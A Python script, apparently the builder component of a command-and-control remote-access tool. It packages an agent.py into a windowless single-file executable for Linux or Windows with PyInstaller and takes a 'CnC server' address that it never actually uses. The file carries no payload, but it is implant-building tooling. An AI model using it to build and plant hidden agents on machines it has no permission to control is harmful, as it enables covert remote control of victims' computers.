import os
import shutil
import tempfile
import config
import time

# TODO: Error running executable on mac. TODO: check for windows, TODO: add mac version (possible fail might be because it is linux generated file)
def build_agent(output, platform):
    prog_name = os.path.basename(output)
    platform = platform.lower()

    if platform not in ['linux', 'windows']:
        print("[!] Supported platforms are 'Linux' and 'Windows'")
        exit(0)
    if os.name != 'posix' and platform == 'linux':
        print("[!] Can only build Linux agents on Linux.")
        exit(0)

    working_dir = os.path.join(tempfile.gettempdir(), config.AGENT_NAME)
    if os.path.exists(working_dir):
        shutil.rmtree(working_dir)

    agent_dir = os.path.dirname(os.path.abspath(__file__))
    shutil.copytree(agent_dir, working_dir)

    cwd = os.getcwd()
    os.chdir(working_dir)
    shutil.move('agent.py', prog_name + '.py')  

    if platform == 'linux':
        os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
        agent_file = os.path.join(working_dir, 'dist', prog_name)

    elif platform == 'windows':
        os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
        time.sleep(2)
        if not prog_name.endswith(".exe"):
            prog_name += ".exe"
        agent_file = os.path.join(working_dir, 'dist', prog_name)
    os.chdir(cwd)

    os.rename(agent_file, output)
    shutil.rmtree(working_dir)
    print("[+] agent built successfully: %s" % output)


def main():
    from argparse import ArgumentParser
    parser = ArgumentParser(description="Builds an agent.")
    parser.add_argument('-p', '--platform', required=True, help="Platform for the (target) agent")
    parser.add_argument('-s', '--server', required=True, help="Address of the CnC server (e.g http://localhost:8080).")
    parser.add_argument('-o', '--output', required=True, help="Output file name.")
    args = parser.parse_args()

    build_agent(
        output=args.output,
        platform=args.platform)


if __name__ == "__main__":
    main()